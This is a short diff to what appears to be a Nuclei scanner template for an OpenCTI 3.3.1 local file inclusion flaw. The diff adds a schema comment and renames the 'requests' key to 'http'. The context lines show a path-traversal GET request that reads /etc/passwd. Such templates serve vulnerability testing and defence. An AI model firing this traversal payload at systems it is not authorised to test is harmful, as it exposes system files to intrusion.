@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: opencti-lfi
 info:
   name: OpenCTI 3.3.1 - Local File Inclusion
@@ -15,7 +16,7 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: opencti,lfi,oss
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/static/css//../../../../../../../../etc/passwd"
